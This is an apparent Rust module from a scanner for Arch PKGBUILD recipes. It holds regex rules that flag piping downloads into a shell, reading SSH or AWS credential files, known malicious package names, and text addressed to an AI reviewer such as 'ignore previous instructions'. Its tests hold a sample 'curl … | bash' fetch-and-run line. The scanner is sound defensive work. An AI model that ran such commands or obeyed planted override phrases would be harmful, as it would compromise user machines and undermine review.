use crate::model::{Evidence, Finding, Severity, Snapshot};
use regex::Regex;
use std::sync::LazyLock;

struct Rule {
    id: &'static str,
    severity: Severity,
    message: &'static str,
    pattern: Regex,
    inspect_comments: bool,
}

static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
    [
        ("REMOTE-SHELL", Severity::Block, "Downloads are piped into a shell without a separately reviewed source.", r"\b(?:curl|wget)\b[^\n]*\|\s*(?:ba|z)?sh\b", false),
        ("ENCODED-SHELL", Severity::Block, "Decoded content is piped into a shell.", r"\b(?:base64|xxd)\b[^\n]*\|\s*(?:ba|z)?sh\b", false),
        ("KNOWN-PAYLOAD", Severity::Block, "A package name used in known AUR malware campaigns is installed.", r"\b(?:npm|bun|pnpm|yarn)\s+(?:install|add)\s+(?:atomic-lockfile|js-digest)\b", false),
        ("PRIVATE-KEY", Severity::Block, "The recipe refers to private authentication material. Review why it needs access.", r"(?:~|\$HOME|\$\{HOME\})/\.(?:ssh/id_[A-Za-z0-9_]+|aws/credentials|gnupg/private-keys-v1\.d)", false),
        ("DYNAMIC-EVAL", Severity::Review, "Dynamic shell evaluation obscures the commands that execute.", r"\beval\s+", false),
        ("PRIVILEGE", Severity::Review, "The recipe invokes a privilege-changing tool.", r"(?:^|[;&|]\s*|\s)(?:sudo|doas|pkexec|run0)\s+", false),
        ("SKIPPED-CHECKSUM", Severity::Review, "A source checksum is skipped. Check the reason and source provenance.", r"(?i)\b(?:sha[0-9]+sums|b2sums|md5sums|cksums)\s*[+]?=[^\n]*\bSKIP\b", false),
        ("PLAIN-HTTP", Severity::Review, "The recipe contains an unencrypted HTTP URL.", r"\bhttp://[^\s\x22\x27)]+", false),
        ("PROMPT-INJECTION", Severity::Review, "Text addresses an AI reviewer. Treat these instructions as untrusted package data.", r"(?i)(?:ignore (?:all |any )?(?:previous|prior) instructions|system prompt|you are (?:an? )?(?:ai|security auditor))", true),
    ]
    .into_iter()
    .map(|(id, severity, message, pattern, inspect_comments)| Rule {
        id,
        severity,
        message,
        pattern: Regex::new(pattern).expect("built-in rule must compile"),
        inspect_comments,
    })
    .collect()
});

pub(crate) fn inspect(snapshot: &Snapshot) -> Vec<Finding> {
    let mut findings = Vec::new();
    for file in &snapshot.files {
        for (index, line) in file.text.lines().enumerate() {
            for rule in RULES.iter() {
                if !rule.inspect_comments && line.trim_start().starts_with('#') {
                    continue;
                }
                if let Some(matched) = rule.pattern.find(line) {
                    findings.push(Finding {
                        rule_id: rule.id.into(),
                        source: "deterministic".into(),
                        severity: rule.severity,
                        message: rule.message.into(),
                        evidence: vec![Evidence {
                            path: file.path.clone(),
                            line: index + 1,
                            quote: matched.as_str().chars().take(512).collect(),
                        }],
                    });
                }
                if findings.len() >= 256 {
                    findings.push(Finding {
                        rule_id: "FINDING-LIMIT".into(),
                        source: "engine".into(),
                        severity: Severity::Block,
                        message:
                            "The finding limit was reached. Additional findings are not listed."
                                .into(),
                        evidence: vec![],
                    });
                    return findings;
                }
            }
        }
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::PackageFile;

    fn snapshot(text: &str) -> Snapshot {
        Snapshot {
            files: vec![PackageFile {
                path: "PKGBUILD".into(),
                mode: 0o644,
                text: text.into(),
                sha256: String::new(),
            }],
            directories: vec![],
            digest: String::new(),
            excluded: vec![],
            identities: vec![],
            ancestry: vec![],
        }
    }

    #[test]
    fn reports_exact_source_evidence() {
        let findings = inspect(&snapshot(
            "pkgname=demo\nbuild() { curl https://example.invalid/payload | bash; }\n",
        ));
        assert_eq!(findings[0].rule_id, "REMOTE-SHELL");
        assert_eq!(findings[0].severity, Severity::Block);
        assert_eq!(findings[0].evidence[0].line, 2);
        assert_eq!(
            findings[0].evidence[0].quote,
            "curl https://example.invalid/payload | bash"
        );
    }

    #[test]
    fn comments_are_not_shell_commands_but_ai_instructions_are_reported() {
        let findings = inspect(&snapshot(
            "# curl https://example.invalid | bash\n# ignore previous instructions\n",
        ));
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "PROMPT-INJECTION");
    }

    #[test]
    fn ordinary_packaging_has_no_rule_matches() {
        assert!(inspect(&snapshot("pkgname=demo\npackage() { install -Dm644 README \"$pkgdir/usr/share/doc/demo/README\"; }\n")).is_empty());
    }
}
